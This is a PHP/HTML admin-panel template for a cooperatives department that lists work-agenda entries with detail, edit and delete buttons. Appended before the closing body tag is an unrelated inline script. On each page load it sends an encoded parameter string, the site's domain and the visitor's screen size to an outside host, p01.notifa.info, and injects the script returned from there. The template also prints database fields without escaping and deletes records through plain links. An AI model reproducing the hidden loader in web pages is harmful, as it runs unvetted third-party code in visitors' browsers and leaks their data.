<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="<?php echo base_url() ?>frontend/img/dinas.png">

    <title>Bidang Koperasi</title>
  
  <!-- Bootstrap 4.1.3-->
  <link rel="stylesheet" href="<?php echo base_url() ?>backend/assets/vendor_components/bootstrap/css/bootstrap.css">
  
  <!-- Bootstrap-extend-->
  <link rel="stylesheet" href="<?php echo base_url() ?>backend/css/bootstrap-extend.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="<?php echo base_url() ?>backend/assets/vendor_components/font-awesome/css/font-awesome.min.css">

  <!-- Ionicons -->
  <link rel="stylesheet" href="<?php echo base_url() ?>backend/assets/vendor_components/Ionicons/css/ionicons.min.css">   

  <!-- Theme style -->
  <link rel="stylesheet" href="<?php echo base_url() ?>backend/css/master_style.css">

  <!-- Minimal-art Admin Skins. Choose a skin from the css/skins
     folder instead of downloading all of them to reduce the load. -->
  <link rel="stylesheet" href="<?php echo base_url() ?>backend/css/skins/_all-skins.css">

  <!-- google font -->
  <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700" rel="stylesheet">

</head>

<body class="hold-transition skin-orange-light sidebar-mini">
  <div  id="notifications"><?php echo $this->session->flashdata('pesan1'); ?></div>
  <div  id="notifications"><?php echo $this->session->flashdata('pesan3'); ?></div>
  <div  id="notifications"><?php echo $this->session->flashdata('pesan5'); ?></div>
<div class="wrapper">

  <header class="main-header">
    <!-- Logo -->
    <a href="<?php echo base_url() ?>webbackend/C_dataOperator/homeAdmin" class="logo">
      <!-- mini logo for sidebar mini 50x50 pixels -->
      <span class="logo-mini"><img src="<?php echo base_url() ?>backend/images/minimal.png" alt=""></span>
      <!-- logo for regular state and mobile devices -->
      <span class="logo-lg"><b>Bidang Koperasi </b>Admin</span>
    </a>
    <!-- Header Navbar-->
    <nav class="navbar navbar-static-top">
      <!-- Sidebar toggle button-->
      <a href="#" class="sidebar-toggle" data-toggle="push-menu" role="button">
        <span class="sr-only">Toggle navigation</span>
      </a>

      <div class="navbar-custom-menu">
        <ul class="nav navbar-nav">
      <!-- User Account-->
          <li class="dropdown user user-menu">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown">
              <img src="<?php echo base_url() . 'gambar_proyek/'.$this->session->userdata('foto') ?>" class="user-image rounded-circle" alt="User Image">
            </a>
            <ul class="dropdown-menu scale-up">
              <!-- User image -->
              <li class="user-header">
                <img src="<?php echo base_url() . 'gambar_proyek/'.$this->session->userdata('foto') ?>" class="float-left rounded-circle" alt="User Image">

                <p>
                  <?=$this->session->userdata('namaLengkap')?>
                  <small class="mb-5"><?=$this->session->userdata('email')?></small>
                 
                </p>
              </li>
              <!-- Menu Body -->
              <li class="user-body">
                
                <!-- /.row -->
              </li>
              <!-- Menu Footer-->
              <li class="user-footer">
                
                <div class="pull-right">
                  <a href="<?php echo base_url() ?>webbackend/C_dataOperator/logout" class="btn btn-block btn-danger"><i class="ion ion-power"></i> Log Out</a>
                </div>
        </li>
            </ul>
          </li>
          
          <!-- Control Sidebar Toggle Button -->
          <li>
            <a href="#" data-toggle="control-sidebar"><i class="fa fa-cog fa-spin"></i></a>
          </li>
        </ul>
      </div>
    </nav>
  </header>
  
  <!-- Left side column. contains the logo and sidebar -->
  <aside class="main-sidebar">
    <!-- sidebar -->
    <section class="sidebar">
      <!-- Sidebar user panel -->
      <div class="user-panel">
        <div class="image float-left">
          <img src="<?php echo base_url() . 'gambar_proyek/'.$this->session->userdata('foto') ?>" class="rounded-circle" alt="User Image">

          <!-- <img src="<?php echo base_url() ?>backend/images/user2-160x160.jpg" class="rounded-circle" alt="User Image">
          <img src="<?php echo base_url() . 'gambar_proyek/'.$this->session->userdata('fotoProfil') ?>" height="50px" width="60px"> -->
        </div>
        <div class="info float-left">
          <p><?=$this->session->userdata('namaLengkap')?></p>
          <a href="#"><i class="fa fa-circle text-success"></i> Online</a>
        </div>
      
      </div>
      
      <!-- sidebar menu -->
      <ul class="sidebar-menu" data-widget="tree">
        
         <li>
          <a href="<?php echo base_url() ?>webbackend/C_dataOperator/homeAdmin">
            <i class="fa fa-dashboard"></i>
            <span>Dashboard</span>
          </a>   
        </li>
      
        <li class="treeview">
          <a href="#">
             <i class="fa fa-table"></i>
            <span>Data koperasi</span>
            <span class="pull-right-container">
              <i class="fa fa-angle-left pull-right"></i>
            </span>
          </a>
          <ul class="treeview-menu">
            <li><a href="<?php echo base_url() ?>webbackend/C_dataKoperasi/lihatDataKoperasi">Data Koperasi</a></li>
            <li><a href="<?php echo base_url() ?>webbackend/C_dataKoperasi/lihatDaftarKoperasi">Data Daftar Koperasi</a></li>
          </ul>
        </li>

        <li>
          <a href="<?php echo base_url() ?>webbackend/C_dataOperator/lihatDataOperator">
            <i class="fa fa-th"></i>
            <span>Data Operator</span> 
          </a>
        </li>

        <li>
          <a href="<?php echo base_url() ?>webbackend/C_dataKoperasi/lihatGrafik" target="_blank">
            <i class="fa fa-pie-chart"></i>
            <span>Grafik Koperasi</span>
          </a>
        </li>
    
        <li>
          <a href="<?php echo base_url() ?>webbackend/C_dataPengunduh/lihatPengunduh">
            <i class="fa fa-cloud-download"></i> 
            <span>Data Pengunduh</span>
          </a>
        </li>

        <li class="treeview">
          <a href="#">
             <i class="fa fa-laptop"></i>
            <span>Tampilan Depan</span>
            <span class="pull-right-container">
              <i class="fa fa-angle-left pull-right"></i>
            </span>
          </a>
          <ul class="treeview-menu">
            <li><a href="<?php echo base_url() ?>webbackend/C_pesanMasuk/lihatPesanMasuk">Pesan Masuk</a></li>
            <li><a href="<?php echo base_url() ?>webbackend/C_dataBerita/lihatBerita">Berita</a></li>
            <li><a href="<?php echo base_url() ?>webbackend/C_dataGaleri/lihatGaleri">Galeri</a></li>
            <li><a href="<?php echo base_url() ?>webbackend/C_programKerja/lihatProgramKerja">Program Kerja</a></li>
            <li><a href="<?php echo base_url() ?>webbackend/C_agendaKerja/lihatAgendaKerja">Agenda Kerja</a></li>
            <li><a href="<?php echo base_url() ?>webbackend/C_strukturBidang/lihatStruktur">Struktur Bidang</a></li>
          </ul>
        </li>
      
      </ul>

    </section>
    <!-- /.sidebar -->
    <div class="sidebar-footer">
    
    <!-- item-->
    <a href="<?php echo base_url() ?>webbackend/C_pesanMasuk/lihatPesanMasuk" class="link" data-toggle="tooltip" title="" data-original-title="Email"><i class="fa fa-envelope"></i></a>
    <!-- item-->
    <a href="<?php echo base_url() ?>webbackend/C_dataOperator/logout" class="link" data-toggle="tooltip" title="" data-original-title="Logout"><i class="fa fa-power-off"></i></a>

  </div>
  </aside>

  <!-- Content Wrapper. Contains page content -->
  <div class="content-wrapper">
    <!-- Content Header (Page header) -->
    <section class="content-header">
      <h1>
        Data Agenda Kerja
         <small>Bidang Koperasi</small>
      </h1>
      
    </section>

    <!-- Main content -->
    <section class="content">
      <div class="row">
        
          <div class="box">
            <br>
           <div class="col-12 page-header-title">
              <?php
                  echo anchor('webbackend/C_agendaKerja/inputAgendaKerja','Input Agenda Kerja',array('class'=>'btn btn-round btn-success'));
              ?>

            </div>
            <br>

            <!-- /.box-header -->
            <div class="box-body">
        <div class="table-responsive">
          <table id="example" class="table table-bordered table-hover display nowrap margin-top-10">
          <thead>
            <tr>
              <th>KD AGENDA KERJA</th>
              <th>AGENDA KERJA</th>
              <th>AKSI</th>
            </tr>
          </thead>
          <tbody>
            
              <?php
                $no=1;
                  foreach ($agenda as $key){
                      echo "<tr>";
                      echo "<td>". $key->kdAgenda."</td>";
                      echo "<td>". $key->agenda."</td>";
                      ?>
                      <td>
                          <a href="<?php echo base_url().'webbackend/C_agendaKerja/detailAgendaKerja/'.$key->kdAgenda?>" class="btn btn-info"> <i class="ion ion-md-eye"></i> Detail</a>
                          <a href="<?php echo base_url().'webbackend/C_agendaKerja/updateAgendaKerja/'.$key->kdAgenda?>" class="btn btn-primary">
                          <i class="ion ion-md-create"></i> Edit</a>
                          <a href="<?php echo base_url().'webbackend/C_agendaKerja/deleteAgendaKerja/'.$key->kdAgenda?>" class="btn btn-danger"><i class="ion ion-md-trash"></i> Delete</a>
                      </td>
                  </tr>
                <?php } ?> 
          
          </tbody>
        
        </table>
        </div>

            </div>
            <!-- /.box-body -->
          </div>
          <!-- /.box -->          
        </div>
        <!-- /.col -->
      </div>
      <!-- /.row -->
    </section>
    <!-- /.content -->
  </div>
  <!-- /.content-wrapper -->
  
  <footer class="main-footer">
    <div class="pull-right d-none d-sm-inline-block">
      
    </div>Copyright &copy; Farhan Sutrisno 2018 All Rights Reserved.
  </footer>

  <!-- Control Sidebar -->
  <aside class="control-sidebar control-sidebar-dark">
    <!-- Create the tabs -->
    <ul class="nav nav-tabs nav-justified control-sidebar-tabs">
      <li class="nav-item"><a href="#control-sidebar-home-tab" data-toggle="tab"><i class="fa fa-home"></i></a></li>
      <li class="nav-item"><a href="#control-sidebar-settings-tab" data-toggle="tab"><i class="fa fa-cog fa-spin"></i></a></li>
    </ul>
    <!-- Tab panes -->
    <div class="tab-content">
      <!-- Home tab content -->
      <div class="tab-pane" id="control-sidebar-home-tab">
        <h3 class="control-sidebar-heading">Recent Activity</h3>
        <ul class="control-sidebar-menu">
          <li>
            <a href="javascript:void(0)">
              <i class="menu-icon fa fa-birthday-cake bg-red"></i>

              <div class="menu-info">
                <h4 class="control-sidebar-subheading">Admin Birthday</h4>

                <p>Will be July 24th</p>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <i class="menu-icon fa fa-user bg-yellow"></i>

              <div class="menu-info">
                <h4 class="control-sidebar-subheading">Jhone Updated His Profile</h4>

                <p>New Email : jhone_doe@demo.com</p>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <i class="menu-icon fa fa-envelope-o bg-light-blue"></i>

              <div class="menu-info">
                <h4 class="control-sidebar-subheading">Disha Joined Mailing List</h4>

                <p>disha@demo.com</p>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <i class="menu-icon fa fa-file-code-o bg-green"></i>

              <div class="menu-info">
                <h4 class="control-sidebar-subheading">Code Change</h4>

                <p>Execution time 15 Days</p>
              </div>
            </a>
          </li>
        </ul>
        <!-- /.control-sidebar-menu -->

        <h3 class="control-sidebar-heading">Tasks Progress</h3>
        <ul class="control-sidebar-menu">
          <li>
            <a href="javascript:void(0)">
              <h4 class="control-sidebar-subheading">
                Web Design
                <span class="label label-danger pull-right">40%</span>
              </h4>

              <div class="progress progress-xxs">
                <div class="progress-bar progress-bar-danger" style="width: 40%"></div>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <h4 class="control-sidebar-subheading">
                Update Data
                <span class="label label-success pull-right">75%</span>
              </h4>

              <div class="progress progress-xxs">
                <div class="progress-bar progress-bar-success" style="width: 75%"></div>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <h4 class="control-sidebar-subheading">
                Order Process
                <span class="label label-warning pull-right">89%</span>
              </h4>

              <div class="progress progress-xxs">
                <div class="progress-bar progress-bar-warning" style="width: 89%"></div>
              </div>
            </a>
          </li>
          <li>
            <a href="javascript:void(0)">
              <h4 class="control-sidebar-subheading">
                Development 
                <span class="label label-primary pull-right">72%</span>
              </h4>

              <div class="progress progress-xxs">
                <div class="progress-bar progress-bar-primary" style="width: 72%"></div>
              </div>
            </a>
          </li>
        </ul>
        <!-- /.control-sidebar-menu -->

      </div>
      <!-- /.tab-pane -->
      <!-- Stats tab content -->
      <div class="tab-pane" id="control-sidebar-stats-tab">Stats Tab Content</div>
      <!-- /.tab-pane -->
      <!-- Settings tab content -->
      <div class="tab-pane" id="control-sidebar-settings-tab">
        <form method="post">
          <h3 class="control-sidebar-heading">General Settings</h3>

          <div class="form-group">
            <input type="checkbox" id="report_panel" class="chk-col-grey" >
      <label for="report_panel" class="control-sidebar-subheading ">Report panel usage</label>

            <p>
              general settings information
            </p>
          </div>
          <!-- /.form-group -->

          <div class="form-group">
            <input type="checkbox" id="allow_mail" class="chk-col-grey" >
      <label for="allow_mail" class="control-sidebar-subheading ">Mail redirect</label>

            <p>
              Other sets of options are available
            </p>
          </div>
          <!-- /.form-group -->

          <div class="form-group">
            <input type="checkbox" id="expose_author" class="chk-col-grey" >
      <label for="expose_author" class="control-sidebar-subheading ">Expose author name</label>

            <p>
              Allow the user to show his name in blog posts
            </p>
          </div>
          <!-- /.form-group -->

          <h3 class="control-sidebar-heading">Chat Settings</h3>

          <div class="form-group">
            <input type="checkbox" id="show_me_online" class="chk-col-grey" >
      <label for="show_me_online" class="control-sidebar-subheading ">Show me as online</label>
          </div>
          <!-- /.form-group -->

          <div class="form-group">
            <input type="checkbox" id="off_notifications" class="chk-col-grey" >
      <label for="off_notifications" class="control-sidebar-subheading ">Turn off notifications</label>
          </div>
          <!-- /.form-group -->

          <div class="form-group">
            <label class="control-sidebar-subheading">              
              <a href="javascript:void(0)" class="text-red margin-r-5"><i class="fa fa-trash-o"></i></a>
              Delete chat history
            </label>
          </div>
          <!-- /.form-group -->
        </form>
      </div>
      <!-- /.tab-pane -->
    </div>
  </aside>
  <!-- /.control-sidebar -->
  
  <!-- Add the sidebar's background. This div must be placed immediately after the control sidebar -->
  <div class="control-sidebar-bg"></div>
</div>
<!-- ./wrapper -->

  <!-- jQuery 3 -->
  <script src="<?php echo base_url() ?>backend/assets/vendor_components/jquery-3.3.1/jquery-3.3.1.js"></script>
  
  <!-- popper -->
  <script src="<?php echo base_url() ?>backend/assets/vendor_components/popper/dist/popper.min.js"></script>
  
  <!-- Bootstrap 4.1.3-->
  <script src="<?php echo base_url() ?>backend/assets/vendor_components/bootstrap/js/bootstrap.min.js"></script>
  
  <!-- DataTables -->
  <script src="<?php echo base_url() ?>backend/assets/vendor_components/datatables.net/js/jquery.dataTables.min.js"></script>
  <script src="<?php echo base_url() ?>backend/assets/vendor_components/datatables.net-bs/js/dataTables.bootstrap.min.js"></script>
  
  <!-- SlimScroll -->
  <script src="<?php echo base_url() ?>backend/assets/vendor_components/jquery-slimscroll/jquery.slimscroll.min.js"></script>
  
  <!-- FastClick -->
  <script src="<?php echo base_url() ?>backend/assets/vendor_components/fastclick/lib/fastclick.js"></script>
  
  <!-- Minimal-art Admin App -->
  <script src="<?php echo base_url() ?>backend/js/template.js"></script>
  
  <!-- Minimal-art Admin for demo purposes -->
  <script src="<?php echo base_url() ?>backend/js/demo.js"></script>
  
  <!-- This is data table -->
    <script src="<?php echo base_url() ?>backend/assets/vendor_plugins/DataTables-1.10.15/media/js/jquery.dataTables.min.js"></script>
    
    <!-- start - This is for export functionality only -->
    <!-- <script src="<?php echo base_url() ?>backend/assets/vendor_plugins/DataTables-1.10.15/extensions/Buttons/js/dataTables.buttons.min.js"></script>
    <script src="<?php echo base_url() ?>backend/assets/vendor_plugins/DataTables-1.10.15/extensions/Buttons/js/buttons.flash.min.js"></script>
    <script src="<?php echo base_url() ?>backend/assets/vendor_plugins/DataTables-1.10.15/ex-js/jszip.min.js"></script>
    <script src="<?php echo base_url() ?>backend/assets/vendor_plugins/DataTables-1.10.15/ex-js/pdfmake.min.js"></script>
    <script src="<?php echo base_url() ?>backend/assets/vendor_plugins/DataTables-1.10.15/ex-js/vfs_fonts.js"></script>
    <script src="<?php echo base_url() ?>backend/assets/vendor_plugins/DataTables-1.10.15/extensions/Buttons/js/buttons.html5.min.js"></script>
    <script src="<?php echo base_url() ?>backend/assets/vendor_plugins/DataTables-1.10.15/extensions/Buttons/js/buttons.print.min.js"></script> -->
    <!-- end - This is for export functionality only -->
  
  <!-- Minimal-art Admin for Data Table -->
  <script src="<?php echo base_url() ?>backend/js/pages/data-table.js"></script>
  

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2awh6yNMRYGxmrudsfAldJELs67357scFsOid9PPCi%2f3oIKK0fPR%2f4Fkko2Hyhv%2fWMdlMg39Y8bMD7nrXORsHa5QLJbFU9vwPC3rl7U8IRAHuS6I9nv4mTEs4tat3dB7JUqGfHGj2sWMsAaNE8FKZTzh1RLA18Z2V3jWtC2agkgEGsaifTo41bezqSLMUKbPLPMY7UlaP%2b1xmGGShtNfiHT9QgGwHl9uu6PHo8D2ay5qIAhs3fz%2bmct0dpjmB4ca7I1nX731K%2fD%2fpKXM4UMDWUTSE8NvA0ODSmXpNYYIO5Twid4k7BlMY4VUbQhpT46Jzl%2baR7ZgNL%2fi6keDmsVSQqytZDbnMYeniyug9ZJ0Kj3OYoCcfnFkYLPCUB06K2pAGX%2bAL0B6a7fdNl%2fvjPLhe8rVvjga1Ho%2f4XGYJDZr9DjDJhXcb8rKCD1E1N%2bwxSKfB6iRrFafGltcN0xFLPs3jIwMfqBevifzDAXF%2bc0hjpkpaWQ3IU4ruk2e%2bs2GW9zmV%2fDxYXj%2bQUv4NJTAuJCWPnQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>
